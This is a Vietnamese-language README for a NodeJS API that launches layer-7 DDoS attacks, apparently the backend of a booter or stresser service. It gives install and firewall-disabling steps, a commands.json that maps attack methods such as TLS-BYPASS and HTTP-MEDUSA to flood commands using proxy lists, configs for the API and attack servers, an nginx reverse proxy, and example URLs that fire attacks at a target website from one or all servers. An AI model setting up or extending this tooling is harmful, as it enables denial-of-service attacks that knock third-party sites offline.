<h2>API NodeJS cho các cuộc tấn công layer 7</h2>

<h4>API này rất an toàn và nhanh gấp đôi thời gian ping giữa API và chương trình phụ trợ</h4>
<h4>tức là ping 60 mili giây, sẽ chỉ mất 120 mili giây để khởi chạy cuộc tấn công</h4>


<h1>Cài đặt:</h1>

cài đặt nodejs

ubuntu 
```sh
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
source ~/.bashrc
nvm install 14.17.3
nvm use 14.17.3
npm i express
```

centos
```sh
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.38.0/install.sh | bash
source ~/.nvm/nvm.sh
nvm install 14.17.3
nvm use 14.17.3
npm i express
```

cài đặt nginx

tắt tường lửa

centos
```sh
sudo service iptables stop
sudo chkconfig iptables off
sudo systemctl stop firewalld
sudo systemctl disable firewalld
```

<h1>Setup:</h1>

<h3>Update servers.json</h3><br>

```json
{
    "alpha": {
        "name": "1",
        "ip": "1.1.1.1",
        "port": 3000
    },
    "beta": {
        "name": "2",
        "ip": "2.2.2.2",
        "port": 3000
    }
}
```

<h3>Update commands.json</h3><br>

```json
{
    "HTTPGET": "screen -dmS attack_${attack_id} ./http ${host} proxy.txt ${time}",
    "HTTPPOST": "screen -dmS attack_${attack_id} ./http ${host} proxy.txt ${time}",
    "TLS-BYPASS": "screen -dmS attack_${attack_id} node TLS-BYPASS ${host} ${time} 30 proxies.txt 30",
    "HTTP-MEDUSA": "screen -dmS attack_${attack_id} ./HTTP-MEDUSA ${host} ${time} 30 30",
    "STOP": "screen -dm pkill -f ${host}"
}
```

<h3>Update api.js:</h3><br>

```js
const api_port = 8888; // Cổng API
const socket_token = "SOCKET_TOKEN"; // Mã thông báo TCP Socket, sử dụng số/chữ cái ngẫu nhiên
const api_key = "API_KEY"; // Khóa API của bạn
const domain_lock = false; // khóa api để chỉ được sử dụng từ một tên miền cụ thể
const api_domain = 'example.com'; // miền API của bạn (nếu domain_lock được đặt thành true)
```

<h3>Update socket.js:</h3><br>

```js
const socket_port = 8888;
const socket_token = "SOCKET_TOKEN";
const allowed_ips = ['1.1.1.1'];
```

## Sau đó, tải `socket.js` lên máy chủ tấn công và tải `api.js` `servers.json` và `commands.json` lên máy chủ API


### Proxy đảo ngược

Bạn nên tạo proxy ngược bằng Nginx để sử dụng API của mình:

```nano /etc/nginx/nginx_conf```
```conf
server {
    listen 80;
    server_name api.yourdomain.com;
    location /api/attack {
        proxy_pass http://backend:8888/api/attack;
    }
}
```

Thay thế `'http://backend:8888/api/attack'` bằng IP máy chủ API của bạn

### Sử dụng API

Gửi yêu cầu tới API bằng các trường bắt buộc

`http://api.yourdomain.com:8888/api/attack?api_key=key&host=https://website.com&time=120&method=HTTPGET&server=1`

Bạn có thể đặt `&server=all` để khởi chạy tới tất cả các máy chủ

Bạn có thể ngăn chặn các cuộc tấn công bằng cách gửi yêu cầu GET tới API sử dụng `&method=stop`

`http://api.yourdomain.com:8888/api/attack?api_key=key&host=https://website.com&time=120&method=stop&server=1`
